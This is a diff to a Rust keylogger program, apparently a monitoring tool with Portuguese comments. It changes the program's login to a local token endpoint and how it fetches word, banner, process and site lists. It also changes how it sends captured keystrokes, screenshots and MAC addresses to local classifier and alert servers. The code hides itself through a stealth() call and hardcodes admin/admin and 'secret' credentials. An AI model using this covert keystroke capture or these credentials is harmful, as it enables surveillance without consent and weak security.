@@ -5,6 +5,8 @@ use std::sync::Mutex;
 use std::thread;
 use std::time::Duration;
 use reqwest;
+use serde::Deserialize;
+use serde_json::Value;
 use std::fs::File;
 use serde_json::{json};
 use std::collections::HashMap;
@@ -25,6 +27,9 @@ use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
 use std::io::{Read, Write};
 use std::collections::HashSet;
 use std::io::{self, BufRead};
+use reqwest::header;
+use url::form_urlencoded;
+use serde_derive::Deserialize;
 
 
 
@@ -179,7 +184,7 @@ async fn process_scan_results() {
     }
 }
 
-async fn keylogger() {
+async fn keylogger() -> ! {
     stealth();
     let mut log = String::new();
 
@@ -204,7 +209,8 @@ async fn keylogger() {
 
         if enter_pressed {
             if !log.is_empty() {
-                report(&log);
+                println!("{}",log);
+                report(&log).await;
                 log.clear();
             }
         }
@@ -225,6 +231,26 @@ fn stealth() {
     }
 }
 
+#[derive(Debug, Deserialize)]
+struct Language {
+    word: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct Port {
+    vulnarableBanners: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct Process {
+    nameExe: String,
+}
+
+#[derive(Debug, Deserialize)]
+struct Website {
+    url: String,
+}
+
 async fn update_aux_data() -> Result<(), Box<dyn std::error::Error>> {
     // Fazer login e obter o token
     let token = match do_login().await {
@@ -241,52 +267,84 @@ async fn update_aux_data() -> Result<(), Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
 
     // Atualizar a lista de palavras proibidas (badLanguage)
-    let bad_languages = client.get("http://localhost:8091/language")
+    let bad_languages = client.get("http://localhost:9000/language?page=1&size=1000&sortBy=id")
         .header("Authorization", format!("Bearer {}", token))
         .send()
         .await?;
     let bad_languages_text = bad_languages.text().await?;
+    let languages: Vec<Language> = serde_json::from_str(&bad_languages_text)?;
+
     let mut bad_language_file = tokio::fs::File::create(r"C:\keyLogger\badLanguage.txt").await?;
-    tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, bad_languages_text.as_bytes()).await?;
+    for language in languages {
+        tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, language.word.as_bytes()).await?;
+        tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, ";".as_bytes()).await?;
+    }
 
     // Atualizar a lista de banners vulneráveis (vulnerable_banners)
-    let vulnerable_banners = client.get("http://localhost:8091/port")
+    let vulnerable_banners = client.get("http://localhost:9000/port?page=1&size=1000&sortBy=id")
         .header("Authorization", format!("Bearer {}", token))
         .send()
         .await?;
     let vulnerable_banners_text = vulnerable_banners.text().await?;
-    let mut vulnerable_banners_file = tokio::fs::File::create(r"C:\keyLogger\vulnerable_banners.txt").await?;
-    tokio::io::AsyncWriteExt::write_all(&mut vulnerable_banners_file, vulnerable_banners_text.as_bytes()).await?;
+    let banners: Vec<Port> = serde_json::from_str(&vulnerable_banners_text)?;
+
+    let mut banners_file = tokio::fs::File::create(r"C:\keyLogger\vulnerable_banners.txt").await?;
+    for banner in banners {
+        tokio::io::AsyncWriteExt::write_all(&mut banners_file, banner.vulnarableBanners.as_bytes()).await?;
+        tokio::io::AsyncWriteExt::write_all(&mut banners_file, ";".as_bytes()).await?;
+    }
 
     // Atualizar a lista de processos maliciosos (maliciousProcess)
-    let malicious_processes = client.get("http://localhost:8091/process")
+    let malicious_processes = client.get("http://localhost:9000/process?page=1&size=1000&sortBy=id")
         .header("Authorization", format!("Bearer {}", token))
         .send()
         .await?;
     let malicious_processes_text = malicious_processes.text().await?;
-    let mut malicious_processes_file = tokio::fs::File::create(r"C:\keyLogger\maliciousProcess.txt").await?;
-    tokio::io::AsyncWriteExt::write_all(&mut malicious_processes_file, malicious_processes_text.as_bytes()).await?;
+    let processes: Vec<Process> = serde_json::from_str(&malicious_processes_text)?;
+
+    let mut processes_file = tokio::fs::File::create(r"C:\keyLogger\maliciousProcess.txt").await?;
+    for process in processes {
+        tokio::io::AsyncWriteExt::write_all(&mut processes_file, process.nameExe.as_bytes()).await?;
+        tokio::io::AsyncWriteExt::write_all(&mut processes_file, ";".as_bytes()).await?;
+    }
 
     // Atualizar a lista de sites bloqueados (sites)
-    let blocked_sites = client.get("http://localhost:8091/website")
+    let blocked_sites = client.get("http://localhost:9000/website?page=1&size=1000&sortBy=id")
         .header("Authorization", format!("Bearer {}", token))
         .send()
         .await?;
     let blocked_sites_text = blocked_sites.text().await?;
-    let mut blocked_sites_file = tokio::fs::File::create(r"C:\keyLogger\sites.txt").await?;
-    tokio::io::AsyncWriteExt::write_all(&mut blocked_sites_file, blocked_sites_text.as_bytes()).await?;
+    let sites: Vec<Website> = serde_json::from_str(&blocked_sites_text)?;
+
+    let mut sites_file = tokio::fs::File::create(r"C:\keyLogger\sites.txt").await?;
+    for site in sites {
+        tokio::io::AsyncWriteExt::write_all(&mut sites_file, site.url.as_bytes()).await?;
+        tokio::io::AsyncWriteExt::write_all(&mut sites_file, ";".as_bytes()).await?;
+    }
 
     Ok(())
 }
 
 async fn do_login() -> Result<String, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
-    let login_data = json!({"login": "string", "password": "string"});
+    let username = "admin";
+    let password = "admin";
 
-    // Fazer login e obter o token
+    let form_data = vec![
+        ("username", username),
+        ("password", password),
+        ("grant_type", "password"),
+    ];
+
+    let body = form_urlencoded::Serializer::new(String::new())
+        .extend_pairs(form_data)
+        .finish();
+
     let response = client
-        .post("http://localhost:8091/login")
-        .json(&login_data)
+        .post("http://localhost:8180/realms/quarkus1/protocol/openid-connect/token")
+        .basic_auth("backend-service", Some("secret"))
+        .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
+        .body(body)
         .send()
         .await?;
 
@@ -295,9 +353,18 @@ async fn do_login() -> Result<String, Box<dyn std::error::Error>> {
         return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_message)));
     }
 
-    let token = response.text().await?;
+    println!("{}", response.status());
+
+    let response_text = response.text().await?;
+    let response_json: Value = serde_json::from_str(&response_text)?;
+
+    let token = response_json["access_token"].as_str()
+        .ok_or_else(|| Box::new(std::io::Error::new(std::io::ErrorKind::Other, "Token não encontrado no JSON")))?
+        .to_string();
+
     Ok(token)
 }
+
 
 fn get_shift_chars() -> HashMap<&'static str, char> {
     let mut shift_chars = HashMap::new();
@@ -312,15 +379,14 @@ async fn is_hate_speech(log: &str) -> bool {
     let data_logs = json!({"valor": 0, "frase": log});
     let client = reqwest::Client::new();
     let res = client
-        .post("http://127.0.0.1:5000/predict")
+        .post("http://localhost:5000/predict")
         .json(&data_logs)
         .send()
         .await;
-
     if let Ok(response) = res {
         if response.status() == reqwest::StatusCode::OK {
             let hate_speech: Vec<HashMap<String, i32>> = response.json().await.unwrap_or_default();
-
+            println!("teste2");
             if let Some(hate_speech_json) = hate_speech.get(0) {
                 if let Some(valor) = hate_speech_json.get("valor") {
                     if *valor == 1 {
@@ -481,10 +547,9 @@ async fn send_alert(log: &str) -> Result<(), Box<dyn std::error::Error>> {
     
     // Construir o objeto ImageData na requisição.
     let image_response = client
-        .post("http://localhost:8091/image/save")
+        .post("http://localhost:9000/image")
         .headers(headers.clone())
         .json(&json!({
-            "id": 0,
             "productImg": log,
             "base64Img": image_data,
         }))
@@ -496,11 +561,11 @@ async fn send_alert(log: &str) -> Result<(), Box<dyn std::error::Error>> {
 
     // Construir o objeto AlertData na requisição.
     let alert_response = client
-        .post("http://localhost:8091/alert/save")
+        .post("http://localhost:9000/alert")
         .headers(headers)
         .json(&json!({
             "pcId": get_mac_as_string(),
-            "imagem": {
+            "image": {
                 "id": image_id
             },
             "processos": get_process(),
